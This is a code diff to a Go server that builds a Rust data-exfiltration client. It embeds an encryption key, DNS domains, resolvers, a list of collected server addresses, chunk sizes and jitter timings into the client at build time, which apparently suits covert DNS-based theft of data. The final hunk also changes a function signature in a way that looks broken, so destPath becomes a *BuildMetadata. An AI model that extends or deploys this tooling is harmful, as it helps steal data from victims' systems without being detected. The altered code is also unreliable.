@@ -636,7 +636,12 @@ func (api *APIServer) executeExfilBuildJob(jobID string, req ExfilClientBuildReq
 	buildMutex.Lock()
 	defer buildMutex.Unlock()
 
-	binaryPath, err := buildExfilClient(req, api.config.SourceDir, api.config.EncryptionKey, targetCfg)
+	serverIPs := collectServerAddresses(cachedDNSServers)
+	if len(serverIPs) == 0 && req.ServerIP != "" {
+		serverIPs = []string{req.ServerIP}
+	}
+
+	binaryPath, err := buildExfilClient(req, api.config.SourceDir, api.config.EncryptionKey, targetCfg, serverIPs)
 	if err != nil {
 		api.failExfilBuildJob(jobID, fmt.Errorf("build failed: %w", err))
 		return
@@ -1222,7 +1227,7 @@ func getConfig() Config {
 }
 
 // buildExfilClient compiles the Rust-based exfiltration client with embedded configuration
-func buildExfilClient(req ExfilClientBuildRequest, sourceRoot, encryptionKey string, targetCfg rustTargetConfig) (string, error) {
+func buildExfilClient(req ExfilClientBuildRequest, sourceRoot, encryptionKey string, targetCfg rustTargetConfig, serverIPs []string) (string, error) {
 	if encryptionKey == "" {
 		return "", fmt.Errorf("encryption key is required to embed configuration")
 	}
@@ -1241,7 +1246,7 @@ func buildExfilClient(req ExfilClientBuildRequest, sourceRoot, encryptionKey str
 		return "", fmt.Errorf("failed to copy exfil client sources: %w", err)
 	}
 
-	if err := embedExfilConfig(buildDir, req, encryptionKey); err != nil {
+	if err := embedExfilConfig(buildDir, req, encryptionKey, serverIPs); err != nil {
 		return "", err
 	}
 
@@ -1440,7 +1445,7 @@ func copyFile(src, dst string) error {
 	return err
 }
 
-func embedExfilConfig(buildDir string, req ExfilClientBuildRequest, encryptionKey string) error {
+func embedExfilConfig(buildDir string, req ExfilClientBuildRequest, encryptionKey string, serverIPs []string) error {
 	configPath := filepath.Join(buildDir, "src", "config.rs")
 	data, err := os.ReadFile(configPath)
 	if err != nil {
@@ -1455,7 +1460,7 @@ func embedExfilConfig(buildDir string, req ExfilClientBuildRequest, encryptionKe
 	encryption_key: "%s".to_string(),
 	domains: %s,
 	resolvers: %s,
-	server_ip: "%s".to_string(),
+	server_ips: %s,
 	chunk_bytes: %d,
 	jitter_min_ms: %d,
 	jitter_max_ms: %d,
@@ -1469,7 +1474,7 @@ func embedExfilConfig(buildDir string, req ExfilClientBuildRequest, encryptionKe
 		formatRustStringLiteral(encryptionKey),
 		formatRustStringSlice(req.Domains),
 		formatRustStringSlice(req.Resolvers),
-		formatRustStringLiteral(req.ServerIP),
+		formatRustStringSlice(serverIPs),
 		req.ChunkBytes,
 		req.JitterMinMs,
 		req.JitterMaxMs,
@@ -1548,6 +1553,29 @@ func collectActiveDomains(servers []map[string]interface{}) []string {
 		}
 	}
 	return domains
+}
+
+func collectServerAddresses(servers []map[string]interface{}) []string {
+	seen := make(map[string]struct{})
+	var ips []string
+	for _, server := range servers {
+		status, _ := server["status"].(string)
+		if status != "active" {
+			continue
+		}
+		if addr, ok := server["address"].(string); ok {
+			addr = strings.TrimSpace(addr)
+			if addr == "" {
+				continue
+			}
+			if _, exists := seen[addr]; exists {
+				continue
+			}
+			seen[addr] = struct{}{}
+			ips = append(ips, addr)
+		}
+	}
+	return ips
 }
 
 const (
@@ -1832,7 +1860,7 @@ func newBuildArtifact(buildType, filename, savedPath string) (*BuildArtifact, er
 	}, nil
 }
 
-func writeBuildMetadata(destPath string, metadata *BuildMetadata) error {
+func writeBuildMetadata(destPath, metadata *BuildMetadata) error {
 	if metadata == nil {
 		return nil
 	}
